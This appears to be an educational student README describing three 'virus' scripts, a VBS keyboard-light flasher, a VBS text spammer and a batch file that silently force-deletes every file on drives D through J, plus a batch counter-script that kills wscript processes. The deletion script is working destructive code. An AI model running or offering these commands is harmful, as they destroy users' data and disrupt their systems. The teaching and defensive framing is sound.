<h1><bold>VBS and BAT Viruses <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Smilies/Bomb.png" alt="Bomb" width="25" height="25" /> - Group Work</bold></h1>

This document is made as an educational material about potentially harmful scripts and how to protect against them. **DO NOT EXECUTE ANY OF THESE SCRIPTS** because they can damage your system.

### 1. Keyboard Lights Flasher ([key.vbs](https://github.com/Ananya-Addisu/Endless-OS/blob/main/key.vbs))
```vbs
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
wscript.sleep 100
wshshell.sendkeys "{NUMLOCK}"
wscript.sleep 100
wshshell.sendkeys "{SCROLLLOCK}"
loop
```
**Effect:** This script keeps switching the Caps Lock, Num Lock, and Scroll Lock keys on and off, which makes the keyboard lights flash non-stop. It won’t damage your data, but it can definitely get annoying.

### 2. Formatter ([form.bat](https://github.com/Ananya-Addisu/Endless-OS/blob/main/form.bat))
```bat
@echo off
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
```
**Effect:** This script is really risky because it tries to delete every file on drives D upto J. The deletion goes like this:
- Silent (`/q` parameter)
- Forced (`/f` parameter) 
- Recursive through all subdirectories (`/s` parameter)

**WARNING:** Running this script can lead to permanent data loss. Once you delete the files, it's tough to get them back without special recovery tools, and even they might not bring everything back. It's like a one time hit and run that can do serious damage right away.

### 3. Text Spammer ([txtspm.bat](https://github.com/Ananya-Addisu/Endless-OS/blob/main/txtspm.bat))
```vbs
Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "This is a harmless virus"
loop
```
**Effect:** This script types out "This is a harmless" virus wherever your cursor is. It can mess with your work by making it tough to type normally and could lead to some accidental things happening if it gets typed into command prompts or other apps.

## Antivirus Solution (ant.bat)

Here’s a script that can help stop harmful VBS scripts like the keyboard flasher and text spammer:

```bat
@echo off
echo Script Terminator - Emergency System Protection
echo =============================================
echo.
echo Scanning for malicious processes...
tasklist | findstr "wscript.exe" > nul
if %ERRORLEVEL% EQU 0 (
    echo ALERT: Found wscript.exe running!
    echo Terminating all wscript processes...
    taskkill /f /im wscript.exe
    echo Process terminated successfully.
) else (
    echo No malicious wscript processes found.
)
echo.
echo Checking system integrity...
echo.
echo NOTE: If files were deleted by the formatter script,
echo immediate actions are required:
echo 1. Disconnect the affected drives
echo 2. Do not write any new data to them
echo 3. Use professional data recovery services or software like recuva
echo   because deleted files are NOT recoverable through standard ways
echo.
echo While this script can stop active malicious scripts,
echo it CANNOT recover files deleted by the formatter script.
echo That damage is irreversible without professional recovery tools.
echo.
pause
```

You can find other batch script and powershell based scripts at [OSSPG4](https://osspg4.vercel.app/#virus-production-and-protection)
